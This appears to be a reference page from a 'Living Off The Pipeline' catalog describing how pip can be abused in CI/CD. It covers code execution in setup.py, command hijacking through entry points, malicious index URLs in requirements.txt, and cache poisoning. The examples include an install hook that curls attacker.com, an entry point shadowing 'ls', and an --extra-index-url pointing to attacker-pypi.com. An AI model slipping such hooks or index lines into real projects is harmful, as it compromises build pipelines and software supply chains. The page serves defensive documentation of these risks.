---
layout: tool
title: pip
tags: [cli, config-file, eval-py]
references:
- https://pip.pypa.io/en/stable/cli/pip_install/
- https://pip.pypa.io/en/stable/reference/build-system/
- https://setuptools.pypa.io/en/latest/userguide/entry_point.html
files: [requirements.txt, constraints.txt, setup.py, pyproject.toml]
---

## Living Off The Pipeline - pip

`pip` is the standard package installer for Python. It has multiple, powerful "Living Off The Pipeline" (LOTP) vectors that allow an attacker to achieve Remote Code Execution (RCE) or other malicious primitives by processing repository-local files.

### Vector 1: `setup.py` Execution (First-Order LOTP Tool)

The most direct vector is `pip`'s execution of `setup.py` scripts when installing a source distribution.

*   **Primitive:** Remote Code Execution (RCE).
*   **Mechanism:** When `pip install` is run on a source distribution (triggered by `pip install .`, `-e .` in a `requirements.txt`, or a local path like `./malicious_package`), it executes the `setup.py` script to build and install the package. An attacker can place malicious code within this script, often in a custom command class.
*   **Example `setup.py`:**
    ```python
    from setuptools import setup
    from setuptools.command.install import install as _install

    class MaliciousInstall(_install):
        def run(self):
            os.system("curl http://attacker.com/pwned")
            _install.run(self)

    setup(name='pwned', cmdclass={'install': MaliciousInstall})
    ```

### Vector 2: Command Hijacking via Entry Points (First-Order LOTP Tool)

A more subtle vector is the hijacking of shell commands via package entry points, which works even for binary wheel (`.whl`) distributions.

*   **Primitive:** RCE (achieved by setting up a malicious command that a later step will execute).
*   **Mechanism:** A `setup.py` or `pyproject.toml` file can define "console scripts." When the package is installed, `pip` creates an executable file in the environment's `bin` directory. An attacker can name their script after a common shell command (e.g., `ls`). If the environment's `bin` directory is first in the `PATH`, any subsequent call to `ls` will execute the attacker's script.
*   **Example `pyproject.toml`:**
    ```toml
    [project.scripts]
    ls = "malicious_ls:main"
    ```

### Vector 3: Index Hijacking via `requirements.txt` (First-Order LOTP Gadget)

`pip` can be reconfigured via the `requirements.txt` file to use a malicious package index.

*   **Primitive:** Dependency Confusion / Supply Chain Attack Setup.
*   **Mechanism:** The `requirements.txt` file can contain an `--index-url` flag to override PyPI, or an `--extra-index-url` flag to add a secondary index. An attacker can point to their own malicious repository. For `--extra-index-url`, `pip` will happily install a package with a higher version number from the malicious index, enabling dependency confusion attacks. A particularly sneaky method is using `-r -` to recursively include a file named `-` containing the malicious index URL.
*   **Example `requirements.txt`:**
    ```
    # Legitimate packages
    requests==2.28.1
    # Malicious extra index
    --extra-index-url https://attacker-pypi.com/simple
    ```

### Vector 4: Cache Poisoning

The vectors above present a significant threat to CI/CD environments that share a dependency cache.

*   **Mechanism:** If a single vulnerable workflow is tricked into downloading a malicious package (e.g., via index hijacking), that malicious package is stored in the shared cache. Subsequent, non-vulnerable workflows on other runners that use this cache may retrieve the poisoned version without re-verifying its hash against the legitimate index, compromising those workflows as well.
